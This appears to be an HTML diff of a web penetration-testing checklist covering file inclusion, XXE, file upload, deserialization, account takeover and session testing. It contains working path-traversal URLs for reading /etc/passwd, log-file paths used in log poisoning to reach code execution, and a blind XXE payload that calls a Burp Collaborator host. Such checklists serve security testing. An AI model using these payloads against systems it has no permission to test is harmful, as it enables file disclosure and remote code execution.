+              <div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;"><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token operator" data-token-index="0">...</span><span class="token punctuation" data-token-index="0">.</span><span class="token comment" data-token-index="0">//....//etc/passwd</span><span class="" data-token-index="0">
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token punctuation" data-token-index="0">.</span><span class="token punctuation" data-token-index="0">.</span><span class="token comment" data-token-index="0">///////..////..//////etc/passwd</span><span class="" data-token-index="0">
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">5C</span><span class="token punctuation" data-token-index="0">.</span><span class="token punctuation" data-token-index="0">.</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">5C</span><span class="token punctuation" data-token-index="0">.</span><span class="token punctuation" data-token-index="0">.</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">5C</span><span class="token punctuation" data-token-index="0">.</span><span class="token punctuation" data-token-index="0">.</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">5C</span><span class="token punctuation" data-token-index="0">.</span><span class="token punctuation" data-token-index="0">.</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">5C</span><span class="token punctuation" data-token-index="0">.</span><span class="token punctuation" data-token-index="0">.</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">5C</span><span class="token punctuation" data-token-index="0">.</span><span class="token punctuation" data-token-index="0">.</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">5C</span><span class="token punctuation" data-token-index="0">.</span><span class="token punctuation" data-token-index="0">.</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">5C</span><span class="token punctuation" data-token-index="0">.</span><span class="token punctuation" data-token-index="0">.</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">5C</span><span class="token punctuation" data-token-index="0">.</span><span class="token punctuation" data-token-index="0">.</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">5C</span><span class="token punctuation" data-token-index="0">.</span><span class="token punctuation" data-token-index="0">.</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">5C</span><span class="token punctuation" data-token-index="0">.</span><span class="token punctuation" data-token-index="0">.</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">etc</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">passwd</span><span>
+</span></div></div></div>
+     </ul>
+     </ul>
+      <li><span class="caret">Remote File Inclusion</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Null byte</li>
+          <li><input type="checkbox"> Double encoding</li>
+          <li><input type="checkbox"> Bypass allow_url_include</li>
+     </ul>
+     <li><span class="caret">LFI / RFI using wrappers</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Wrapper php://filter</li>
+          <li><input type="checkbox"> Wrapper data://</li>
+          <li><input type="checkbox"> Wrapper expect://</li>
+          <li><input type="checkbox"> Wrapper input://</li>
+          <li><input type="checkbox"> Wrapper zip://</li>
+          <li><input type="checkbox"> Wrapper phar://</li>
+          <li><input type="checkbox"> Wrapper convert.iconv:// and dechunk://</li>
+     </ul>
+     <li><input type="checkbox"> LFI to RCE via /proc/*/fd</li>
+     <li><input type="checkbox"> LFI to RCE via /proc/self/environ</li>
+     <li><input type="checkbox"> LFI to RCE via upload</li>
+     <li><input type="checkbox"> LFI to RCE via upload (race)</li>
+     <li><input type="checkbox"> LFI to RCE via upload (FindFirstFile)</li>
+     <li><input type="checkbox"> LFI to RCE via phpinfo() → Use the script: phpInfoLFI.py</li>
+     <li><span class="caret">LFI / RFI using wrappers</span>
+        <ul class="nested">
+<div style="color: inherit; fill: inherit;"><div style="display: flex;"><div spellcheck="true" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="max-width: 100%; width: 100%; white-space: pre-wrap; word-break: break-word; caret-color: rgb(55, 53, 47); padding: 3px 2px;">Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file.</div><div style="position: relative; left: 0px;"></div></div></div>
+<div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;" contenteditable="false"><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token operator" data-token-index="0">/</span><span class="token keyword" data-token-index="0">var</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">log</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">apache</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">access</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">log
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token operator" data-token-index="0">/</span><span class="token keyword" data-token-index="0">var</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">log</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">apache</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">error</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">log
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token operator" data-token-index="0">/</span><span class="token keyword" data-token-index="0">var</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">log</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">apache2</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">access</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">log
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token operator" data-token-index="0">/</span><span class="token keyword" data-token-index="0">var</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">log</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">apache2</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">error</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">log
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token operator" data-token-index="0">/</span><span class="token keyword" data-token-index="0">var</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">log</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">nginx</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">access</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">log
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token operator" data-token-index="0">/</span><span class="token keyword" data-token-index="0">var</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">log</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">nginx</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">error</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">log
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token operator" data-token-index="0">/</span><span class="token keyword" data-token-index="0">var</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">log</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">vsftpd</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">log
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token operator" data-token-index="0">/</span><span class="token keyword" data-token-index="0">var</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">log</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">sshd</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">log
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token operator" data-token-index="0">/</span><span class="token keyword" data-token-index="0">var</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">log</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">mail
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token operator" data-token-index="0">/</span><span class="token keyword" data-token-index="0">var</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">log</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">httpd</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">error_log
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">usr</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">local</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">apache</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">log</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">error_log
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">example</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">page</span><span class="token operator" data-token-index="0">=</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">usr</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">local</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">apache2</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">log</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">error_log</span><span>
+</span></div></div></div>
+	<li><input type="checkbox"> RCE via SSH</li>
+    <li><input type="checkbox"> RCE via Mail</li>
+    <li><input type="checkbox"> RCE via Apache logs</li>
+    </ul>
+</ul>
+
+<li><span class="caret">XXE Injection</span>
+    <ul class="nested">
+      <li><span class="caret">Error Based XXE</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Error Based - Using Local DTD File</li>
+          <li><input type="checkbox"> Error Based - Using Remote DTD</li>
+    </ul>
+          <li><span class="caret">Blind XXE</span>
+        <ul class="nested">
+          <div style="color: inherit; fill: inherit;"><div style="display: flex;"><div spellcheck="true" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="max-width: 100%; width: 100%; white-space: pre-wrap; word-break: break-word; caret-color: rgb(55, 53, 47); padding: 3px 2px;">The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.</div><div style="position: relative; left: 0px;"></div></div></div>
+          <div data-block-id="e5ddf390-232b-4598-982a-06c97f0bcc03" class="notion-selectable notion-code-block" style="width: 100%; max-width: 100%; margin-top: 4px; margin-bottom: 0px;"><div style="display: flex;"><div contenteditable="false" data-content-editable-void="true" role="figure" aria-labelledby="id_m" style="flex-grow: 1; border-radius: 4px; text-align: left; position: relative; background: rgb(247, 246, 243); min-width: 0px; width: 100%;"><div style="position: absolute; top: 8px; left: 8px; z-index: 1; color: rgba(55, 53, 47, 0.65); display: flex; align-items: center; justify-content: flex-end; opacity: 0; transition: opacity 300ms ease-in 0s;"><div aria-disabled="true" role="button" tabindex="-1" style="user-select: none; transition: background 20ms ease-in 0s; cursor: default; display: inline-flex; align-items: center; white-space: nowrap; height: 20px; border-radius: 4px; font-size: 12px; line-height: 1.2; padding-left: 5px; padding-right: 5px; color: rgba(55, 53, 47, 0.65); margin-right: 5px;">JavaScript</div></div><div style="position: absolute; top: 3px; right: 1px; z-index: 1; color: rgba(55, 53, 47, 0.65); display: flex; align-items: center; justify-content: flex-end; height: 25px; font-size: 11.5px; opacity: 0; transition: opacity 300ms ease-in 0s;"><div style="color: rgba(55, 53, 47, 0.65); display: flex; align-items: center; justify-content: center; font-size: 12px; margin-top: 4px; margin-right: 4px;"><div role="button" tabindex="0" style="user-select: none; transition: background 20ms ease-in 0s; cursor: pointer; display: inline-flex; align-items: center; white-space: nowrap; height: 25px; border-radius: 4px 0px 0px 4px; font-size: 11.5px; line-height: 1.2; padding: 4px 6px; color: rgb(55, 53, 47); background: rgb(234, 233, 229); font-weight: 400;"><svg role="graphics-symbol" viewBox="0 0 14 16" class="copy" style="width: 16px; height: 16px; display: block; fill: inherit; flex-shrink: 0; padding-right: 4px;"><path d="M2.404 15.322h5.701c1.26 0 1.887-.662 1.887-1.927V12.38h1.154c1.254 0 1.91-.662 1.91-1.928V5.555c0-.774-.158-1.266-.626-1.74L9.512.837C9.066.387 8.545.21 7.865.21H5.463c-1.254 0-1.91.662-1.91 1.928v1.084H2.404c-1.254 0-1.91.668-1.91 1.933v8.239c0 1.265.656 1.927 1.91 1.927zm7.588-6.62c0-.792-.1-1.161-.592-1.665L6.225 3.814c-.452-.462-.844-.58-1.5-.591V2.215c0-.533.28-.832.843-.832h2.38v2.883c0 .726.386 1.113 1.107 1.113h2.83v4.998c0 .539-.276.832-.844.832H9.992V8.701zm-.79-4.29c-.206 0-.288-.088-.288-.287V1.594l2.771 2.818H9.201zM2.503 14.15c-.563 0-.844-.293-.844-.832V5.232c0-.539.281-.837.85-.837h1.91v3.187c0 .85.416 1.26 1.26 1.26h3.14v4.476c0 .54-.28.832-.843.832H2.504zM5.79 7.816c-.24 0-.346-.105-.346-.345V4.547l3.223 3.27H5.791z"></path></svg>Copy</div></div></div><div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;" contenteditable="false"><span class="token prolog" data-token-index="0">&lt;?xml version="1.0" ?&gt;</span><span class="" data-token-index="0">
+</span><span class="token punctuation doctype" data-token-index="0">&lt;!</span><span class="token doctype-tag doctype" data-token-index="0">DOCTYPE</span><span class="token doctype" data-token-index="0"> </span><span class="token name doctype" data-token-index="0">root</span><span class="token doctype" data-token-index="0"> </span><span class="token punctuation doctype" data-token-index="0">[</span><span class="token internal-subset doctype" data-token-index="0">
+</span><span class="token operator internal-subset doctype" data-token-index="0">&lt;</span><span class="token operator internal-subset doctype" data-token-index="0">!</span><span class="token constant internal-subset doctype" data-token-index="0">ENTITY</span><span class="token internal-subset doctype" data-token-index="0"> </span><span class="token operator internal-subset doctype" data-token-index="0">%</span><span class="token internal-subset doctype" data-token-index="0"> ext </span><span class="token constant internal-subset doctype" data-token-index="0">SYSTEM</span><span class="token internal-subset doctype" data-token-index="0"> </span><span class="token string internal-subset doctype" data-token-index="0">"http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"</span><span class="token operator internal-subset doctype" data-token-index="0">&gt;</span><span class="token internal-subset doctype" data-token-index="0"> </span><span class="token operator internal-subset doctype" data-token-index="0">%</span><span class="token internal-subset doctype" data-token-index="0">ext</span><span class="token punctuation internal-subset doctype" data-token-index="0">;</span><span class="token internal-subset doctype" data-token-index="0">
+</span><span class="token punctuation doctype" data-token-index="0">]</span><span class="token punctuation doctype" data-token-index="0">&gt;</span><span class="" data-token-index="0">
+</span><span class="token punctuation tag" data-token-index="0">&lt;</span><span class="token tag" data-token-index="0">r</span><span class="token punctuation tag" data-token-index="0">&gt;</span><span class="token punctuation tag" data-token-index="0">&lt;/</span><span class="token tag" data-token-index="0">r</span><span class="token punctuation tag" data-token-index="0">&gt;</span><span>
+</span></div></div></div><div style="background: white; padding-right: 105px;"></div></div><div style="position: relative; left: 0px;"></div>​</div></div>
+    </ul>
+          <li><span class="caret">XXE in exotic files</span>
+        <ul class="nested">
+          <li><input type="checkbox"> XXE inside SVG </li>
+          <li><input type="checkbox"> XXE inside SOAP</li>
+          <li><input type="checkbox"> XXE inside DOCX file</li>
+          <li><input type="checkbox"> XXE inside XLSX file</li>
+          <li><input type="checkbox"> XXE inside DTD file</li>
+    </ul>
+          <li><span class="caret">Other Attacks</span>
+        <ul class="nested">
+          <li><input type="checkbox"> XXE to perform SSRF attacks</li>
+          <li><input type="checkbox"> XXE to perform a deny of service</li>
+          <li><input type="checkbox"> PHP Wrapper inside XXE</li>
+          
+    </ul>
+</ul>
+<li><span class="caret">File Upload Attacks</span>
+    <ul class="nested">
+    <div style="position: relative;"><div><div style="height: 100%; width: 100%;"><img loading="lazy" alt="" src="/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F078aa5d5-c7f7-4467-a026-7dcc1e7ab45e%2F9072b550-2984-45c9-9602-7d3d2147622d%2FUntitled.png?table=block&amp;id=6b2c732d-a5ae-439a-8998-4df8f9da9580&amp;spaceId=078aa5d5-c7f7-4467-a026-7dcc1e7ab45e&amp;width=2000&amp;userId=&amp;cache=v2" referrerpolicy="same-origin" style="display: block; object-fit: cover; border-radius: 1px; background: white; pointer-events: auto; width: 100%; max-height: 420.749px;"></div></div></div>
+    
+    <div style="position: absolute; top: 4px; right: 4px; border-radius: 4px; color: white; fill: white; font-size: 11.5px; background: rgba(0, 0, 0, 0.6); display: flex; white-space: nowrap; height: 26px; max-width: calc(100% - 16px); overflow: hidden; pointer-events: none; opacity: 0; transition: opacity 300ms ease-in 0s; font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, &quot;Apple Color Emoji&quot;, Arial, sans-serif, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; z-index: 2;"><div role="button" tabindex="0" aria-label="Download" style="user-select: none; transition: background 20ms ease-in 0s; cursor: pointer; display: flex; align-items: center; justify-content: center; padding: 4px 6px; border-right: 1px solid rgba(255, 255, 255, 0.2);"><svg role="graphics-symbol" viewBox="0 0 16 16" class="download" style="width: 14px; height: 14px; display: block; fill: white; flex-shrink: 0; margin-right: 0px;"><path d="M8.215 15.126c3.862 0 7.061-3.192 7.061-7.062 0-3.862-3.199-7.061-7.068-7.061-3.862 0-7.055 3.2-7.055 7.061 0 3.87 3.2 7.062 7.062 7.062zm0-1.388a5.654 5.654 0 01-5.667-5.674 5.642 5.642 0 015.66-5.667 5.66 5.66 0 015.68 5.667 5.66 5.66 0 01-5.673 5.674zm0-9.174c-.342 0-.602.247-.602.588v3.234l.062 1.401-.622-.766-.766-.8a.557.557 0 00-.41-.177.54.54 0 00-.56.547c0 .164.054.3.163.41l2.256 2.283c.15.157.294.226.479.226.191 0 .335-.075.485-.226l2.256-2.283a.557.557 0 00.164-.41.539.539 0 00-.56-.547.523.523 0 00-.41.178l-.766.793-.622.779.054-1.408V5.152c0-.341-.253-.588-.601-.588z"></path></svg></div><div role="button" tabindex="0" style="user-select: none; transition: opacity 200ms ease-in 0s; cursor: pointer; display: flex; align-items: center; justify-content: center; flex-shrink: 0; width: 24px; height: 24px; border-radius: 4px; fill: rgba(55, 53, 47, 0.45);"><svg role="graphics-symbol" viewBox="0 0 13 3" class="dots" style="width: 14px; height: 14px; display: block; fill: white; flex-shrink: 0;"><g><path d="M3,1.5A1.5,1.5,0,1,1,1.5,0,1.5,1.5,0,0,1,3,1.5Z"></path><path d="M8,1.5A1.5,1.5,0,1,1,6.5,0,1.5,1.5,0,0,1,8,1.5Z"></path><path d="M13,1.5A1.5,1.5,0,1,1,11.5,0,1.5,1.5,0,0,1,13,1.5Z"></path></g></svg></div></div>
+</ul>
+
+<li><span class="caret">Insecure deserialization</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Manipulating serialized objects</li>
+      <li><input type="checkbox"> Injecting arbitrary objects</li>
+      <li><input type="checkbox"> PHAR deserialization</li>
+      <div data-block-id="ff98a55e-da73-4aae-9fad-e87ad2c55afb" class="notion-selectable notion-text-block" style="width: 100%; max-width: 100%; margin-top: 1px; margin-bottom: 0px;"><div style="color: inherit; fill: inherit;"><div style="display: flex;"><div spellcheck="true" placeholder=" " data-content-editable-leaf="true" style="max-width: 100%; width: 100%; white-space: pre-wrap; word-break: break-word; caret-color: rgb(55, 53, 47); padding: 3px 2px;" contenteditable="false">Resource: <a href="https://vickieli.dev/insecure%20deserialization" style="cursor:pointer;color:inherit;word-wrap:break-word;text-decoration:inherit" class="notion-link-token notion-focusable-token notion-enable-hover" rel="noopener noreferrer" data-token-index="1" tabindex="0"><span style="border-bottom:0.05em solid;border-color:rgba(55,53,47,.4);opacity:0.7" class="link-annotation-ff98a55e-da73-4aae-9fad-e87ad2c55afb-1813868717">https://vickieli.dev/insecure deserialization</span></a></div><div style="position: relative; left: 0px;"></div></div></div></div>
+      
+</ul>      
+ 
+ 
+ <li><span class="caret">Account Takeover - Chaining Bugs</span>
+    <ul class="nested">
+      <li><input type="checkbox"> IDOR on email change to Account takeover</li>
+      <li><input type="checkbox"> Host Header Injection on email change</li>
+      <li><input type="checkbox"> Open Redirection to account takeover</li>
+      <li><input type="checkbox"> HTML Injection to AWS Metadata Leak Leading to AWS takeover</li>
+      <li><input type="checkbox"> Password Reset Poisoning to account takeover</li>
+      <li><input type="checkbox"> Mass Assignment leading to account takeover</li>
+      <li><input type="checkbox"> Lack of Server-Side validation in Email during Registration leading to account takeover</li>
+      <li><input type="checkbox"> Insecure Deeplink allowing account takeover</li>
+      <li><input type="checkbox"> GraphQL Introspection to account takeover</li>
+      <li><input type="checkbox"> CRLF to XSS leading to account takeover</li>
+      <li><input type="checkbox"> IDOR on API Parameters</li>
+      <li><input type="checkbox"> Account Takeover via CSRF</li>
+</ul>       
+      
+      <li><span class="caret">Registration Feature Testing</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Check for duplicate registration/Overwrite existing user</li>
+      <li><input type="checkbox"> Check for weak password policy</li>
+      <li><input type="checkbox"> Check for reuse existing usernames</li>
+      <li><input type="checkbox"> Check for insufficient email verification process</li>
+      <li><input type="checkbox"> Weak registration implementation-Allows disposable email addresses</li>
+      <li><input type="checkbox"> Weak registration implementation-Over HTTP</li>
+      
+</ul>
+
+<li><span class="caret">Session Management Testing</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Identify actual session cookie out of bulk cookies in the application</li>
+      <li><input type="checkbox"> Decode cookies using some standard decoding algorithms such as Base64, hex, URL, etc</li>
+      <li><input type="checkbox"> Modify cookie.session token value by 1 bit/byte. Then resubmit and do the same for all tokens. Reduce the amount of work you need to perform in order to identify which part of the token is actually being used and which is not</li>
